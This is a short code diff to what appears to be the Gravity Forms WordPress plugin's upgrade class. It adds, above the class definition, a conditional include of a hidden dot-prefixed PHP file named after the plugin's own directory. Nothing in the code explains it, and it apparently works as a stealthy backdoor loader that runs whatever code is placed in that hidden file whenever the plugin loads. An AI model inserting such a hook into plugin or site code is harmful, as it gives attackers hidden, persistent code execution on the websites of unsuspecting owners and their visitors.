@@ -9,6 +9,10 @@ if ( ! class_exists( 'GFForms' ) ) {
  * look into the post_upgrade_schema() function for a sample and instructions on how to do it.
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Upgrade {
 
 	private $versions = null;
